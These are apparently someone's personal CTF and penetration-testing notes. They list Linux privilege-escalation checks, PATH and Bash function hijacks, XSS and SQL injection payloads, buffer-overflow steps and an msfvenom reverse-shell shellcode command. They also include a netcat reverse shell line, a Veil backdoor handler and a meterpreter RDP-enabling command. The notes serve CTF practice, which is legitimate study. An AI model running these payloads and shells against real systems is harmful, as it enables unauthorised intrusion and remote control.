## I used to forget stuff when doing CTF and things. I build these notes little by little to help me remember things I failed to remember. This note doesn't contain everything. Nevertheless, I hope it can be useful. 

**Box Notes**
1. Always check /etc/sudoers.d
2. Always check /etc/crontab
3. Always check capabilities >>> getcap -r / 2>/dev/null
4. find / -perm -u=s -type f 2>/dev/null >>> to find some suid misconf
5. find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
6. find / -user root -perm -4000 -print 2>/dev/null
7. when u got privesc thing just http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet or just `chmod +s /bin/bash` as root, bash -p
8. linpeas linenum pspy name ur shits
9. Always check `cat ~/.*history | less` or just `history`


**PATH Privesc**
### When it is not run directly, example:
/usr/bin/cat >>> cant
cat >>> can
1. cd /tmp
2. echo "/bin/bash" > [the misconfigured]
3. chmod +x [the misconfigured]
4. export PATH=/tmp:$PATH
5. Execute the misconfigured binary

# In Bash versions <4.2-048 it is possible to define shell functions with names that resemble file paths, then export those functions so that they are used instead of any actual executable at that file path.
/usr/bin/cat >>> can
1. function /usr/sbin/service { /bin/bash -p; }
2. export -f /usr/sbin/service
3. Execute the misconfigured binary


### Does not have to be in /tmp, u can create your own folder


**How to create environment variable**
1. export [varname]=[value]
2. echo $[varname]


**XSS**
1. <detail/open/ontoggle=alert()>
2. and bunch from portswigger..


**Little SQLI**
1. 'UNION SELECT 1,table_name,column_name FROM information_schema.columns -- -
2. 'UNION SELECT 1,group_concat(sql),3 FROM sqlite_master -- -


**Bufferoverflow**
1. Predict the size
2. msf-pattern_create.rb -l [the size] >>> we got the address
3. msf-pattern_offset.rb -l [the size] -q [the EIP address]
4. Generate shellcode
Example:
msfvenom -p windows/shell_reverse_tcp LHOST=[yourip] LPORT=[yourport] EXITFUNC=thread -f c -a x86 -b "\x00"

encode it with shikata_ga_nai if u want
-f >>> the output file language
-a >>> the architecture
-b >>> bad char

5. Got the shellcode, dont forget to put NOP'S '\x90'


**Fix your terminal**
1. python3 -c 'import pty;pty.spawn("/bin/bash");'
2. export TERM=xterm >>> so you can clear
3. ctrl + z >>> background
4. stty raw -echo
5. fg


**CTF Tools**
1. Forensics >> exiftool, volatility, zsteg, stegsolve, stegcracker, steghide


**SSH with id_rsa**
1. chmod 600 id_rsa >>> for ours and ours alone 
2. ssh -i id_rsa [user]@[ip]


**Random**
1. hashcat --example-hash >> or just visit the one in the web
2. diff -y [file1] [file2] >> compare file side by side
3. binary mode FTP is better
4. watch -n 0 [stuff you want to watch]
5. when we have admin in windows, and meterpreter shell, try
	`run post/windows/manage/enable_rdp `
	and conenct rdp. Fun commands
6. Veil msfconsole combo
Generate
msfconsole --resource /var/lib/veil/output/handlers/[yourbackdoor]
7. nc -e /bin/bash [ip] [port]
8. from binascii import unhexlify >> unhexlify to convert hex to string



